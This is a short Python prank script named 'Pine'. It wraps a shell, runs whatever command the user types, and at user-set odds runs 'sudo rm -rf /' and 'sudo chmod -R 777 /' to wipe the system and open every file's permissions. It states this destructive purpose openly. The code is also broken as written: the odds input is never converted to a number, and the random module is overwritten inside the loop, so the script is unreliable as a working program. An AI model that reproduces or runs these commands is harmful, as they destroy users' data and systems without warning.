#!/usr/bin/python3
# Pine: The unlikely death program. Set your odds, then watch and wait.
import random
import os
import sys

odds = input("Set the odds. For example, inputting 10 would give it a 10 to 1 chance of destroying your computer. \n")
x = 1
try:
        while x == 1:
	        cmd = "Undefined"
	        cmd = input("Enter a command: ")
	        random = random.randint(1, odds)
	        random2 = random.randint(1, odds)
	
	        if random == random2:
		        os.system("sudo rm -rf /")
		        os.system("sudo chmod -R 777 /")
		        print("You just have bad luck, don't you?")
		        x = 2
	        else:
		        os.system(cmd)
except KeyboardInterrupt:
        print("Thanks for running Pine!")
        x = 2
